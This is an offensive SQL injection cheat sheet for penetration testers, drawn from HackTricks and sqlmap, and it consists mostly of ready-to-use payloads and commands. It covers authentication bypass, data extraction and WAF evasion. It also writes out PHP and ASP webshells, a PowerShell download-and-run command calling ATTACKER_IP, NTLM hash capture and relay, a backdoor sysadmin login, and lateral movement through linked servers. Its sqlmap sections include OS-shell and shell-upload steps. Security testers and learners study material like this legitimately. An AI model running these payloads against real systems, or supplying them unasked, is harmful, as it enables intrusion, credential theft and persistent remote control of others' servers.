# SQL Injection — Quick Reference

**References:**

- https://book.hacktricks.xyz/pentesting-web/sql-injection
- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
- https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://github.com/sqlmapproject/sqlmap/wiki/usage-

## Error-Based Discovery → Full Extraction

```sql
-- 1. Trigger errors
'
"
)'
'abc
-- 2. Version detection
' UNION SELECT @@version,NULL--              -- MSSQL
' UNION SELECT version(),NULL--              -- MySQL/PostgreSQL
' AND 1=convert(int,@@version)--             -- force error with version
-- 3. Column count
' ORDER BY 1--                               -- increment until error
' UNION SELECT NULL,NULL--                   -- match column count
-- 4. Extract data
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```
## Blind Boolean → Data Extraction

```sql
-- 1. Confirm boolean control
admin' AND 1=1--                             -- should succeed
admin' AND 1=2--                             -- should fail
-- 2. Test table existence
admin' AND (SELECT 'x' FROM users LIMIT 1)='x'--
-- 3. Extract data length
admin' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--
-- 4. Extract char by char (binary search for speed)
admin' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97--
```
## Time-Based Blind

```sql
'; IF 1=1 WAITFOR DELAY '0:0:5'--           -- MSSQL
' AND SLEEP(5)--                             -- MySQL
' AND 1=(SELECT 1 FROM pg_sleep(5))--        -- PostgreSQL
DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)           -- Oracle
-- Test table existence
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
-- Extract char
'; IF ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))=97 WAITFOR DELAY '0:0:5'--
```
## UNION Attacks

```sql
' UNION SELECT 1,2,3--                      -- identify displayable columns
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION ALL SELECT name,NULL,NULL FROM master..sysdatabases--  -- MSSQL list DBs
GROUP_CONCAT(column_name)                    -- concatenate rows (MySQL)
STRING_AGG(column_name,',')                  -- concatenate rows (MSSQL)
LISTAGG(column_name,',')                     -- concatenate rows (Oracle)
```
## Authentication Bypass

```sql
admin'--
admin'#
' OR '1'='1
') OR ('1'='1
' OR 'x'='x
' OR 1=1 LIMIT 1--
' UNION SELECT 1,'admin','81dc9bdb52d04dc20036dbd8313ed055',1--  -- fake admin session (MD5 of '1234')
'; INSERT INTO users (username,password,admin) VALUES ('evil','evil',1)--
```
## Column & Type Discovery

```sql
ORDER BY 1--                                 -- increment to find column count
' HAVING 1=1--                               -- error reveals first column name
' GROUP BY table.column1 HAVING 1=1--        -- reveals next column
' UNION SELECT NULL,NULL,NULL--              -- test count and types
SELECT * FROM users WHERE id=-1 UNION ALL SELECT null,null,convert(image,1)--  -- test types
```
## Database Version Fingerprinting

```sql
SELECT @@version                             -- MSSQL
SELECT version()                             -- MySQL / PostgreSQL
SELECT banner FROM v$version                 -- Oracle
SELECT sqlite_version()                      -- SQLite
SELECT SERVERPROPERTY('ProductVersion')      -- MSSQL detailed
```
## String Operations (No-Quote Bypasses)

```sql
CHAR(75)+CHAR(76)+CHAR(77)                  -- 'KLM' (MSSQL)
CHR(75)||CHR(76)||CHR(77)                    -- 'KLM' (Oracle)
0x446F672021                                 -- 'Dog!' hex (MySQL)
CONCAT('a','b','c')                          -- MySQL
'a' + 'b' + 'c'                              -- MSSQL
'a' || 'b' || 'c'                            -- Oracle/PostgreSQL
```
## Comment Techniques

```sql
--                                           -- standard line comment
#                                            -- MySQL line comment
/**/                                         -- inline comment
/*!50001 SELECT * FROM users*/               -- MySQL version-specific
--+-                                         -- alternative
;%00                                         -- null byte
```
## WAF Bypass

```sql
SeL/**/ecT                                   -- split keywords
%53%45%4c%45%43%54                           -- URL encode
CONCAT('SE','LECT')                          -- string concat
0x73656c656374                               -- hex encode
CHAR(115,101,108,101,99,116)                 -- ASCII chars
UnIoN/**/SeLeCt/**/1,2--                     -- mixed case + comments
```
## File Read

```sql
-- MySQL
SELECT LOAD_FILE('/etc/passwd')
' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--
-- MSSQL
EXEC xp_cmdshell 'type c:\boot.ini'
SELECT BulkColumn FROM OPENROWSET(BULK 'c:\boot.ini', SINGLE_CLOB) AS x
CREATE TABLE mydata(line VARCHAR(8000));BULK INSERT mydata FROM 'c:\windows\win.ini'
-- Oracle
SELECT TO_CHAR(DBMS_XMLGEN.getXML('select * from v$version'))
```
## File Write / Webshell

```sql
-- MySQL webshell
' UNION SELECT NULL,'<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/shell.php'--
-- MSSQL ASP shell
EXEC master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["cmd"])%^> > c:\inetpub\wwwroot\shell.aspx'
sp_makewebtask 'c:\inetpub\wwwroot\test.asp','SELECT ''<%Execute(Request("cmd"))%>'''
```
## MSSQL Command Execution (xp_cmdshell)

```sql
-- Enable
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-- Execute
EXEC xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'powershell -ep bypass iex(new-object net.webclient).downloadstring(''http://ATTACKER_IP/shell.ps1'')';
-- Disable (stealth)
EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;
-- COM object alternative (if xp_cmdshell blocked)
DECLARE @shell INT;EXEC sp_oacreate 'wscript.shell',@shell OUTPUT;EXEC sp_oamethod @shell,'run',null,'cmd.exe /c whoami';
```
## MSSQL Impersonation & Privilege Escalation

```sql
-- Check current user & role
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_MEMBER('db_owner');
-- Who can we impersonate?
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
-- Impersonate sa
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- should return 1
-- Revert
REVERT;
-- Create backdoor sysadmin
CREATE LOGIN youruser WITH PASSWORD = 'YourPass123!';
EXEC sp_addsrvrolemember 'youruser','sysadmin';
```
## MSSQL Linked Servers (Lateral Movement)

```sql
-- Enumerate linked servers
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin;
-- Query through linked server
SELECT * FROM OPENQUERY([LINKED_SRV], 'SELECT @@servername');
SELECT * FROM OPENQUERY([LINKED_SRV], 'SELECT loginname FROM syslogins WHERE sysadmin=1');
-- Enable RPC out (needed for xp_cmdshell on linked server)
EXEC sp_serveroption 'LINKED_SRV','rpc out','True';
-- Execute commands on linked server
EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [LINKED_SRV];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SRV];
-- Double hop (through two linked servers)
EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [LINKED_SRV2]') AT [LINKED_SRV1];
```
## MSSQL Domain Enumeration (via SQLi or xp_cmdshell)

```sql
-- Domain info via SQL functions (no xp_cmdshell needed)
SELECT DEFAULT_DOMAIN();
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'));
-- Brute-force domain users by RID (1000-2000)
SELECT SUSER_SNAME(0x01050000000...<domain_sid_bytes>...e803);  -- RID 1000
SELECT SUSER_SNAME(0x01050000000...<domain_sid_bytes>...e903);  -- RID 1001
-- Domain enumeration via xp_cmdshell
EXEC xp_cmdshell 'net user /domain';
EXEC xp_cmdshell 'net group "Domain Admins" /domain';
EXEC xp_cmdshell 'net group "Domain Controllers" /domain';
EXEC xp_cmdshell 'nltest /domain_trusts';
EXEC xp_cmdshell 'net view \\target-host';
```
## MSSQL NTLM Hash Theft & Relay

```sql
-- Force NTLM auth to your attacker box (capture with responder/impacket-smbserver)
EXEC master..xp_dirtree '\\ATTACKER_IP\share';
EXEC master..xp_subdirs '\\ATTACKER_IP\share';
EXEC master..xp_fileexist '\\ATTACKER_IP\share\file';
```
On Kali:
```bash
# Capture the hash
sudo responder -I tun0
# or
sudo impacket-smbserver share ./ -smb2support
# Relay to another MSSQL or SMB target
ntlmrelayx.py -t mssql://TARGET_MSSQL -i -smb2support --no-multirelay
```
## MSSQL System Enumeration Stored Procedures

```sql
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'netstat -an';
EXEC xp_cmdshell 'tasklist /v';
EXEC xp_cmdshell 'sc query state= all';
SELECT HOST_NAME();
SELECT @@SERVERNAME;
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';
EXEC xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion';
EXEC xp_availablemedia;                      -- list drives
EXEC xp_enumdsn;                             -- ODBC data sources
EXEC xp_loginconfig;                         -- auth details
EXEC xp_ntsec_enumdomains;                   -- list domains
EXEC master..xp_dirtree 'C:\',1,1;           -- list directory
EXEC master..xp_fileexist 'C:\Windows\win.ini';
```
## MSSQL Connecting from Kali

```bash
# Impacket (preferred)
impacket-mssqlclient DOMAIN/user:password@TARGET -windows-auth
impacket-mssqlclient sa:password@TARGET                          # SQL auth
impacket-mssqlclient user@TARGET -hashes :NTHASH                 # pass-the-hash
# sqsh
sqsh -S TARGET -U sa -P password
sqsh -S TARGET -U 'DOMAIN\user' -P password
# sqlcmd
sqlcmd -S TARGET,1433 -U sa -P password
```
## SQLMap

### Basic Usage
```bash
# GET parameter
sqlmap -u "http://target/page.php?id=1" --batch
# POST data
sqlmap -u "http://target/page.php" --data="user=admin&pass=test" --batch
# From Burp saved request (best method — handles cookies/headers automatically)
sqlmap -r request.txt --batch
# Specify injection point with *
sqlmap -u "http://target/page.php?id=1*&safe=dont_touch" --batch
```
### Authentication & Headers

```bash
# With cookies
sqlmap -u "http://target/page.php?id=1" --cookie="PHPSESSID=abc123; session=xyz"
# Inject inside cookie value
sqlmap -u "http://target/" --cookie="vuln_cookie=*"
# Custom headers
sqlmap -u "http://target/" --headers="X-Forwarded-For:127.0.0.1*"
sqlmap -u "http://target/" --headers="Authorization: Bearer <token>"
# Random user agent
sqlmap -u "http://target/page.php?id=1" --random-agent
```
### Enumeration Workflow
```bash
# 1. Fingerprint & detect
sqlmap -r request.txt --batch --banner
# 2. List databases
sqlmap -r request.txt --batch --dbs
# 3. List tables
sqlmap -r request.txt --batch -D dbname --tables
# 4. List columns
sqlmap -r request.txt --batch -D dbname -T users --columns
# 5. Dump specific columns
sqlmap -r request.txt --batch -D dbname -T users -C username,password --dump
# 6. Dump everything
sqlmap -r request.txt --batch --dump-all
# Quick info gathering
sqlmap -r request.txt --batch --current-user --current-db --hostname --is-dba
```
### Technique Selection
```bash
# Force specific techniques: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -r request.txt --technique=BEU --batch
sqlmap -r request.txt --technique=T --batch        # time-based only
# Increase detection
sqlmap -r request.txt --level=5 --risk=3 --batch   # max detection
```

> `--level` controls what gets tested: 1=default, 2+=cookies, 3+=User-Agent/Referer, 5=max payloads. `--risk` controls payload danger: 3 includes heavy time-based and OR-based that could modify data.
### OS Shell & Command Execution
```bash
# Interactive OS shell
sqlmap -r request.txt --os-shell --batch
# Single command
sqlmap -r request.txt --os-cmd="whoami" --batch
# SQL shell
sqlmap -r request.txt --sql-shell --batch
# Meterpreter shell
sqlmap -r request.txt --os-pwn --batch
# Privesc attempt
sqlmap -r request.txt --priv-esc --batch
```
### File Read/Write
```bash
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --file-write="./shell.php" --file-dest="/var/www/html/shell.php"
```
### WAF Bypass with Tampers
```bash
# Single tamper
sqlmap -r request.txt --tamper=space2comment --batch
# Common tamper stack
sqlmap -r request.txt --tamper="apostrophemask,apostrophenullencode,randomcase" --batch
# All tampers in: /usr/share/sqlmap/tamper/
```
Common tampers: `space2comment`, `between`, `randomcase`, `charencode`, `base64encode`, `apostrophemask`, `apostrophenullencode`, `equaltolike`, `space2dash`, `space2mssqlblank`
### Performance & Tuning
```bash
# Threads (faster)
sqlmap -r request.txt --threads=10 --batch
# Delay between requests (evasion)
sqlmap -r request.txt --delay=1 --batch
# Proxy through Burp for inspection
sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
# Force DBMS type (skip fingerprinting)
sqlmap -r request.txt --dbms=mssql --batch
# Force SSL
sqlmap -r request.txt --force-ssl --batch
# Second-order injection (inject here, result shows there)
sqlmap -r request.txt --second-order="http://target/results.php" --batch
```
### Hash Dumping
```bash
# Dump DB user password hashes
sqlmap -r request.txt --passwords --batch
# Dump all with auto-crack
sqlmap -r request.txt --dump -D dbname -T users --batch
```
## SQLMap + MSSQL Scenario Cheat Sheet

```bash
# 1. Confirm injection, check if DBA
sqlmap -r request.txt --batch --is-dba --current-user --hostname
# 2. If DBA → get OS shell
sqlmap -r request.txt --os-shell --batch
# 3. If not DBA → dump creds, look for SA password
sqlmap -r request.txt --passwords --batch
sqlmap -r request.txt -D master -T syslogins --dump --batch
# 4. Enumerate for domain info via SQL shell
sqlmap -r request.txt --sql-shell --batch
# Then in SQL shell:
SELECT DEFAULT_DOMAIN();
SELECT SUSER_SNAME(0x01050000000...<sid>...e803);
```
## Conditional Logic

```sql
IF(1=1,'true','false')                       -- MySQL
CASE WHEN 1=1 THEN 'true' ELSE 'false' END  -- MSSQL/PostgreSQL
DECODE(1,1,'true','false')                   -- Oracle
```
## Quick Wins Table

|Test|Payload|Expected|Next Steps|
|---|---|---|---|
|Basic Error|`'` or `"`|SQL error|Error-based → version → tables|
|Auth Bypass|`admin'--` or `' OR '1'='1'--`|Login|Enum admin panel → extract users|
|UNION|`' ORDER BY 1--` (increment)|Error at N+1|UNION SELECT NULLs → extract|
|Blind Boolean|`' AND 1=1--` vs `' AND 1=2--`|Different response|Binary search → dump tables|
|Time Based|`' AND SLEEP(5)--`|5s delay|Automate with sqlmap `--technique=T`|
|Version|`' UNION SELECT @@version,NULL--`|DB version|Match version exploits|
|File Read|`' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--`|File contents|Read configs → find creds|
|CMD Exec|`'; EXEC xp_cmdshell 'whoami'--`|Command output|Rev shell → system access|
|NTLM Theft|`'; EXEC xp_dirtree '\\ATTACKER\s'--`|Hash at responder|Crack or relay the hash|
|Bulk Extract|`' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables--`|Table list|Map DB → dump creds|
|WAF Bypass|`' UnIoN/**/SeLeCt/**/1,2--`|Bypass success|Chain with extraction|
